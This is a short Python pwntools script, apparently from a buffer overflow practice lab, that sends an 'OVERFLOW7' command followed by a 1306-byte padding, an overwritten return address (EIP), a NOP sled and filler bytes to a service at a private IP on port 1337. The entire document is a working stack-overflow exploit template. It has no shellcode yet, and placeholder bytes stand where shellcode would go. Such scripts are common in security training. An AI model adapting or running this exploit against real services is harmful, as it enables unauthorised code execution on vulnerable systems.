#!/usr/bin/env python3

from pwn import *

host = "10.10.207.155"
port = 1337

s = remote(host, port)
total_length = 1500
offset = 1306
new_eip = p32(0x62501203)
nop = b"\x90" * 5


payload = [
    b"OVERFLOW7 ",
    b"A" * offset,
    new_eip,
    nop,
    b"C" * (total_length - offset - len(new_eip) - len(nop)),

]

payload = b"".join(payload)
s.send(payload)
s.close()